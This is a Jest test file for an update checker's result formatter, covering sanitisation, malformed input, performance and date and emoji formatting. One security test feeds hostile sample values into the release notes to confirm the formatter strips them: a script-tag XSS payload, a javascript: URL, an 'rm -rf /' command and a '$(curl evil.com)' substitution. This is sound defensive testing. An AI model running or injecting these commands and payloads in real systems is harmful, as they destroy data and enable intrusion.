import { describe, it, expect, beforeEach } from '@jest/globals';
import { UpdateChecker } from '../../../src/update/UpdateChecker.js';
import { VersionManager } from '../../../src/update/VersionManager.js';

describe('UpdateChecker (Security & Performance)', () => {
  let updateChecker: UpdateChecker;
  let versionManager: VersionManager;

  beforeEach(() => {
    versionManager = new VersionManager();
    updateChecker = new UpdateChecker(versionManager);
  });

  describe('security validation', () => {
    it('should sanitize release notes in format output', () => {
      const maliciousResult = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-05T10:00:00Z',
        releaseNotes: '<script>alert("xss")</script>Legitimate content\n`rm -rf /`\n$(curl evil.com)',
        releaseUrl: 'javascript:alert("xss")'
      };

      const formatted = updateChecker.formatUpdateCheckResult(maliciousResult);

      // Should not contain dangerous content
      expect(formatted).not.toContain('<script>');
      expect(formatted).not.toContain('javascript:');
      expect(formatted).not.toContain('`rm -rf /`');
      expect(formatted).not.toContain('$(curl');
      
      // But should contain legitimate content
      expect(formatted).toContain('Legitimate content');
      expect(formatted).toContain('Update Available');
    });

    it('should handle very long release notes safely', () => {
      const longReleaseNotes = 'A'.repeat(100000); // 100KB of text
      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-05T10:00:00Z',
        releaseNotes: longReleaseNotes,
        releaseUrl: 'https://github.com/test/repo'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);

      // Should be truncated to reasonable length
      expect(formatted.length).toBeLessThan(10000);
      expect(formatted).toContain('Update Available');
    });

    it('should validate constructor parameters', () => {
      expect(() => new UpdateChecker(null as any)).toThrow();
      expect(() => new UpdateChecker(undefined as any)).toThrow();
      
      // Should work with valid version manager
      expect(() => new UpdateChecker(versionManager)).not.toThrow();
    });

    it('should handle malformed result objects safely', () => {
      const malformedResults = [
        null,
        undefined,
        {},
        { currentVersion: null },
        { isUpdateAvailable: 'not a boolean' },
        { releaseDate: 'invalid date' }
      ];

      malformedResults.forEach(result => {
        expect(() => {
          updateChecker.formatUpdateCheckResult(result as any);
        }).not.toThrow();
      });
    });
  });

  describe('performance and reliability', () => {
    it('should complete update check within reasonable time', async () => {
      const startTime = Date.now();
      
      try {
        await updateChecker.checkForUpdates();
      } catch (error) {
        // Expected - might fail due to network issues in test environment
      }
      
      const duration = Date.now() - startTime;
      expect(duration).toBeLessThan(30000); // 30 seconds max
    });

    it('should handle concurrent format operations efficiently', () => {
      const testResult = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-05T10:00:00Z',
        releaseNotes: 'Test release notes',
        releaseUrl: 'https://github.com/test/repo'
      };

      const startTime = Date.now();
      
      // Format many results concurrently
      const operations = Array(100).fill(null).map(() => 
        updateChecker.formatUpdateCheckResult(testResult)
      );
      
      const duration = Date.now() - startTime;
      
      expect(operations).toHaveLength(100);
      expect(duration).toBeLessThan(1000); // Should be very fast
      
      operations.forEach(formatted => {
        expect(formatted).toContain('Update Available');
        expect(formatted).toContain('1.0.0');
        expect(formatted).toContain('1.1.0');
      });
    });
  });

  describe('output format validation', () => {
    it('should format update available result consistently', () => {
      const result = {
        currentVersion: '1.0.0',
        latestVersion: '2.0.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-05T10:00:00Z',
        releaseNotes: 'Major release with new features',
        releaseUrl: 'https://github.com/mickdarling/DollhouseMCP/releases/tag/v2.0.0'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);

      expect(formatted).toContain('Update Available');
      expect(formatted).toContain('1.0.0');
      expect(formatted).toContain('2.0.0');
      expect(formatted).toContain('Major release');
      expect(formatted).toMatch(/🆕|🚀|✨/); // Should contain update emoji
    });

    it('should format no update result consistently', () => {
      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.0.0',
        isUpdateAvailable: false,
        releaseDate: '2025-01-01T10:00:00Z',
        releaseNotes: '',
        releaseUrl: ''
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);

      expect(formatted).toContain('Up to Date');
      expect(formatted).toContain('1.0.0');
      expect(formatted).toMatch(/✅|🎉/); // Should contain success emoji
    });

    it('should format error result with helpful information', () => {
      const error = new Error('Network connection failed');
      const formatted = updateChecker.formatUpdateCheckResult(null, error);

      expect(formatted).toContain('Update Check Failed');
      expect(formatted).toContain('Network connection failed');
      expect(formatted).toMatch(/❌|⚠️/); // Should contain error emoji
    });

    it('should include persona indicator when provided', () => {
      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.0.0',
        isUpdateAvailable: false,
        releaseDate: '2025-01-01T10:00:00Z',
        releaseNotes: '',
        releaseUrl: ''
      };

      const formatted = updateChecker.formatUpdateCheckResult(result, undefined, '[TestPersona]');

      expect(formatted).toContain('[TestPersona]');
      expect(formatted).toContain('Up to Date');
    });

    it('should handle special characters in version strings', () => {
      const result = {
        currentVersion: '1.0.0-beta.1+build.123',
        latestVersion: '1.0.0-rc.1+build.456',
        isUpdateAvailable: true,
        releaseDate: '2025-01-05T10:00:00Z',
        releaseNotes: 'Pre-release version',
        releaseUrl: 'https://github.com/test/repo'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);

      expect(formatted).toContain('1.0.0-beta.1');
      expect(formatted).toContain('1.0.0-rc.1');
      expect(formatted).toContain('Update Available');
    });

    it('should format dates in readable format', () => {
      const result = {
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        isUpdateAvailable: true,
        releaseDate: '2025-01-05T10:30:45Z',
        releaseNotes: 'Test release',
        releaseUrl: 'https://github.com/test/repo'
      };

      const formatted = updateChecker.formatUpdateCheckResult(result);

      // Should contain human-readable date format
      expect(formatted).toMatch(/January|February|March|April|May|June|July|August|September|October|November|December/);
      expect(formatted).toMatch(/\d{1,2}, 2025/);
    });
  });

  describe('error handling edge cases', () => {
    it('should handle network errors gracefully', async () => {
      // This test may fail in CI environment, but should not crash
      try {
        const result = await updateChecker.checkForUpdates();
        expect(result).toBeDefined();
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        expect((error as Error).message).toBeDefined();
      }
    });

    it('should handle empty error objects', () => {
      const emptyError = new Error('');
      const formatted = updateChecker.formatUpdateCheckResult(null, emptyError);

      expect(formatted).toContain('Update Check Failed');
      expect(typeof formatted).toBe('string');
    });

    it('should handle non-Error objects as errors', () => {
      const nonError = 'String error message';
      const formatted = updateChecker.formatUpdateCheckResult(null, nonError as any);

      expect(formatted).toContain('Update Check Failed');
      expect(typeof formatted).toBe('string');
    });
  });
});